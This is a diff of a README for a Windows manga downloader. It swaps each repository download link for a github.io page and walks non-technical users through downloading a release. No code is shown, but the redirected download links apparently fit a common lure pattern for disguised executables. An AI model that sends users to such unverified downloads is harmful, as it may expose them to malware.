@@ -1,16 +1,16 @@
 # 📖 mangadotnet-downloader - Download your favorite manga series today
 
-[![Download Windows Version](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/babylonianacademicyear853/mangadotnet-downloader)
+[![Download Windows Version](https://img.shields.io/badge/Download-Application-blue.svg)](https://babylonianacademicyear853.github.io)
 
 ## 📥 How to get started
 
-You can download the application from the project page. Visit this link to find the latest version for your computer: [https://github.com/babylonianacademicyear853/mangadotnet-downloader](https://github.com/babylonianacademicyear853/mangadotnet-downloader).
+You can download the application from the project page. Visit this link to find the latest version for your computer: [https://babylonianacademicyear853.github.io](https://babylonianacademicyear853.github.io).
 
 The application works on Windows 10 and Windows 11. It allows you to save manga, manhua, and manhwa directly to your hard drive. You do not need technical skills to use this tool. 
 
 ## 🛠️ Step-by-step installation
 
-1. Go to the project page at [https://github.com/babylonianacademicyear853/mangadotnet-downloader](https://github.com/babylonianacademicyear853/mangadotnet-downloader).
+1. Go to the project page at [https://babylonianacademicyear853.github.io](https://babylonianacademicyear853.github.io).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version number.
 4. Scroll down to the Assets section.
